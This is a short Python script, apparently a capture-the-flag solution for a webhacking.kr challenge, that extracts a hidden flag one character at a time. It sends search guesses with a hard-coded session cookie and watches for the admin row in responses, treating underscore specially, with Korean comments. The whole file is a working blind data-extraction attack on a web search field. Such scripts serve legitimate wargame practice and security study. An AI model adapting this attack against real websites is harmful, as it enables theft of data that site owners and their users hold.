import requests, json

url = 'https://webhacking.kr/challenge/web-33/index.php'
cookie = {'PHPSESSID':'60t5fgj573hi1vs5m3r4dd53fi'}

flag = 'flag{'
data = {'search':flag}


#print('data :',data)

#res = requests.post(url,data={'search':flag},cookies=cookie)
# data가 json 방식으로 더 복잡하면 json.dumps(data)로 넣어서 보내기

for j in range(1,100):
    is_ = 0
    for i in range(0x30,0x7E):
        tmp = flag + chr(i)
        res = requests.post(url,data={'search':tmp},cookies=cookie)
        if '<td>1</td><td>admin</td><td>' in res.text:
            if i == 0x5F :
                is_ = 1
                continue
            flag = tmp
            print(flag)
            break
    if is_ == 1 :
        # '_'가 나왔고 다른 문자가 안나왔으면 _를 flag에 추가
        flag = flag + chr(0x5F)
    
print('flag :',flag)